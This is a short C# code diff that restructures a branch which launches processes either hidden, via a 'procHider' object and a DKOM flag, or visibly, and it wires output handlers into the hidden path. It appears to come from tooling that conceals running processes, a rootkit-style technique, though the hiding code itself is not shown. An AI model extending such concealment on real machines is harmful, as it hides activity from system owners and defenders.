@@ -109,9 +109,13 @@ namespace Manager
         {
 #if (CHECK_OS)
             if (!System.Environment.Is64BitOperatingSystem && DKOM) // temp
+            {
 #endif
                 processObj = this.procHider.StartHiddenProcess(path, args, exitEvntHandler, outEvntHandler, errEvntHandler, out stdin);
+                outEvntHandler += outputHandler;
+                errEvntHandler += outputHandler;
 #if (CHECK_OS)
+            }
             else
             {
                 processObj = this.procHider.StartVisibleProcess(path, args, outputHandler);
